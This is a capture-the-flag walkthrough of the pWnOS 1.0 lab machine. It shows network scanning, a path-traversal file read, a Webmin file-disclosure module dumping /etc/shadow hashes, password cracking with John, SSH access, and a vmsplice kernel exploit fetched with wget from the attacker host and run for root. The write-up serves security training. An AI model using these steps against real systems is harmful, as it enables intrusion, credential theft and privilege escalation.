# pWnOS:1.0

## 1.Get VM IP
```bash
root@kali: nmap -sn 192.168.127.0/24

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:20 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00021s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.138
Host is up (0.00041s latency).
MAC Address: 00:0C:29:5E:18:C9 (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00033s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
```

The IP address is `192.168.127.138`, let's enumerate the machine.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.138 -oN fullscan

Nmap scan report for 192.168.127.138
Host is up (0.0019s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 e4:46:40:bf:e6:29:ac:c6:00:e2:b2:a3:e1:50:90:3c (DSA)
|_  2048 10:cc:35:45:8e:f2:7a:a1:cc:db:a0:e8:bf:c7:73:3d (RSA)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp   open  ��c��U      Samba smbd 3.0.26a (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 00:0C:29:5E:18:C9 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: ubuntuvm
|   NetBIOS computer name: 
|   Domain name: nsdlab
|   FQDN: ubuntuvm.NSDLAB
|_  System time: 2023-09-09T05:33:29-05:00
|_nbstat: NetBIOS name: UBUNTUVM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 2h30m03s, deviation: 3h32m08s, median: 2s
|_smb2-time: Protocol negotiation failed (SMB2)
```

smb enumeration led to nothing intresting.

but exploring the web showed a web application :

![mainpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4b436200-9be0-449e-aa5d-135320f2a4d0)

despite having XSS here, it does not help for exploiting but manipulating the `connect` parameter will show an error :

![erropage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2873eb2c-ebf4-43cd-9ded-055b81013eb5)

the error shows some kind of inclusion in the page that is intresting for testing LFI, changing the connect parameter to show

the `/etc/passwd` is successful when using the path traversal payload :

![etcpasswd](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3b41a83d-191d-4ebd-be02-bbce458eeda8)

after showing the `/etc/passwd` we detect 4 users in the system :

- vmware
- obama
- osama
- yomama

this is greate, we now know the users on the system by this vulnerability.

now its time to check the other open port (10000)

### 2.1.Webmin

Let's check if webmin has any exploit availabel :

```bash
root@kali: searchsploit webmin

Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure | multiple/remote/2017.pl
```
i also checked metasploit for webmin and it has an auxilary for webmin -> `auxiliary/admin/webmin/file_disclosure`

i used this auxilary and it worked, just change the `RPATH` to `/etc/shadow`:

```bash
msf6 auxiliary(admin/webmin/file_disclosure) > options

Module options (auxiliary/admin/webmin/file_disclosure):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.127.138   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
                                        it.html
   RPATH    /etc/passwd       yes       The file to download
   RPORT    10000             yes       The target port (TCP)
   SSL      false             no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name      Description
   ----      -----------
   Download  Download arbitrary file



View the full module info with the info, or info -d command.

msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadow
rpath => /etc/shadow
msf6 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.127.138

[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:*:14040:0:99999:7:::
bin:*:14040:0:99999:7:::
sys:*:14040:0:99999:7:::
sync:*:14040:0:99999:7:::
games:*:14040:0:99999:7:::
man:*:14040:0:99999:7:::
lp:*:14040:0:99999:7:::
mail:*:14040:0:99999:7:::
news:*:14040:0:99999:7:::
uucp:*:14040:0:99999:7:::
proxy:*:14040:0:99999:7:::
www-data:*:14040:0:99999:7:::
backup:*:14040:0:99999:7:::
list:*:14040:0:99999:7:::
irc:*:14040:0:99999:7:::
gnats:*:14040:0:99999:7:::
nobody:*:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
```

now we have user hashes and can crack them.

## 3.Gaining Shell

I tried the first account, vmware, to crack its hash using john

just save the `vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::` to vmware.hash file and give it to john :

```bash
root@kali: john vmware.hash --wordlist=/usr/share/wordlists/rockyou.txt

Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h4ckm3           (vmware)     
1g 0:00:00:47 DONE (2023-09-10 03:06) 0.02116g/s 160830p/s 160830c/s 160830C/s h4ndoff8..h4884625
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

yes we have vmware user password now and we can SSH to the server :

```bash
root@kali: ssh vmware@192.168.127.138

vmware@192.168.127.138's password: 
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
Last login: Sun Sep 10 02:07:37 2023 from 192.168.127.128
vmware@ubuntuvm:~$
```

## 4.Privilege Escalation

We check the kernel version of the system :

```bash
vmware@ubuntuvm:/home$ uname -a
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
```

this is an old kernel we search for any exploit for it :

```bash
vmware@ubuntuvm:/home$ searchsploit kernel 2.6 | grep -i escalation

Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2)                                                | linux/local/5092.c
Linux Kernel 2.6.17.4 - 'proc' Local Privilege Escalation                                                                 | linux/local/2013.c
Linux Kernel 2.6.18 < 2.6.18-20 - Local Privilege Escalation                                                              | linux/local/10613.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                         | linux/local/50135.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)        | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)           | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)        | linux/local/40839.c
```

after trying some exploit and not working i tried the `linux/local/5092.c` exploit on the victim.

just upload the exploit on the victim and compile it :

```text
vmware@ubuntuvm:/tmp$ wget http://192.168.127.128/5092.c                                                                                                   
--02:16:10--  http://192.168.127.128/5092.c
           => `5092.c'
Connecting to 192.168.127.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6,288 (6.1K) [text/x-csrc]

100%[================================================================================================================>] 6,288         --.--K/s             

02:16:10 (573.83 KB/s) - `5092.c' saved [6288/6288]

vmware@ubuntuvm:/tmp$ ls
5092.c  sqlmrnmih

vmware@ubuntuvm:/tmp$ gcc 5092.c 
5092.c:289:28: warning: no newline at end of file

vmware@ubuntuvm:/tmp$ ls
5092.c  a.out  sqlmrnmih

vmware@ubuntuvm:/tmp$ ./a.out 
-----------------------------------
 Linux vmsplice Local Root Exploit
 By qaaz
-----------------------------------
[+] mmap: 0x0 .. 0x1000
[+] page: 0x0
[+] page: 0x20
[+] mmap: 0x4000 .. 0x5000
[+] page: 0x4000
[+] page: 0x4020
[+] mmap: 0x1000 .. 0x2000
[+] page: 0x1000
[+] mmap: 0xb7e57000 .. 0xb7e89000
[+] root
root@ubuntuvm:/tmp# id
uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)

root@ubuntuvm:/tmp# 
```









